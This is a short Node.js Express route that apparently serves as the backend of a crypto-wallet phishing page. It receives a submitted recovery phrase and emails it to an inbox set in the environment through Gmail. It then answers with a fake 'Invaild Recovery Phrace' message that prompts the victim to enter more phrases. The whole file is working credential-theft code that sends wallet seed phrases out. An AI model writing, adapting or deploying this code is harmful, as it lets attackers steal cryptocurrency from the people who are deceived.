const nodeMailer = require("nodemailer");
require('dotenv').config();
const express = require('express');
const router = express.Router();

router.post('/', async (req, res) => {
    try {
        const phrace = req.body.phrace;
        if(!phrace) return {error: "Phrace cannot be empty"};

        const {WASCO_USER, WASCO_PASS, WASCO_TO} = process.env
        let mailTransport = nodeMailer.createTransport({
            
            service: 'gmail',
            auth: {
                user: WASCO_USER,
                pass: WASCO_PASS
            }
        });

        let details = {
            from: process.env.WASCO_USER,
            to: WASCO_TO,
            subject: "Recovery Phrace",
            text: phrace
        }

        await mailTransport.sendMail(details, (err) => {
            if (err) return console.log("NODE_MAIL_ERROR", err);

            console.log("NODE_MAIL_SUCCESS");
            return res.send("Invaild Recovery Phrace Please Enter Another Recovery Phrace");
        })

    } catch (error) {
        console.log(error);
        res.send("Something went wrong");
    } 
});
module.exports = router;